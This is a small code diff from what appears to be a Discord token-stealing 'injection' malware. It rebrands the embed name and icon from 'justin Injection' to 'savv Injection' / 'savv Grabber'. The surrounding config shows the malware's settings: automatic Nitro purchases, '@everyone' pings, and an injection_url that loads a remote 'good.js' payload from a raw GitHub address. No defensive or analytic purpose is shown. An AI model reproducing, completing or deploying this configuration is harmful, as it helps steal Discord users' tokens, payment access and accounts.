@@ -11,8 +11,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'justin Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1156752356445257815/1158534769827643522/vxmZJC6.png'.replace(/ /g, '%20'),
+  embed_name: 'savv Injection', 
+  embed_icon: 'https://media.discordapp.net/attachments/1351435538837540888/1351674049104842762/savv_Grabber.png?ex=67db3c0e&is=67d9ea8e&hm=54f45aaf45324fcb6aeed73192e8a0f681d02a30929423461f19b5bc2d32577e&=&format=webp&quality=lossless'.replace(/ /g, '%20'),
   embed_color: 15548997, 
   injection_url: 'https://raw.githubusercontent.com/u8i9vnyhngvjyfvyjf6uy/539835689456/main/good.js', 
 
